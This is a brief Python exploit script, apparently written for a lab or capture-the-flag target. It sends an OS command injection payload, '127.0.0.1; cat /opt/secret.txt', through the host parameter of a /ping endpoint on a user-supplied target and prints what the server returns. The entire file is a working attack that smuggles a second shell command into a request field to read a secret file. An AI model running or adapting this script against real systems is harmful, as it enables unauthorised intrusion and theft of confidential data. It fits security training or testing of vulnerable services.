import argparse
import urllib.request
import urllib.parse

parser = argparse.ArgumentParser()
parser.add_argument("--target", required=True)
args = parser.parse_args()

host, port = args.target.split(":")
payload = "127.0.0.1; cat /opt/secret.txt"
url = f"http://{host}:{port}/ping?" + urllib.parse.urlencode({"host": payload})
with urllib.request.urlopen(url, timeout=10) as resp:
    print(resp.read().decode())
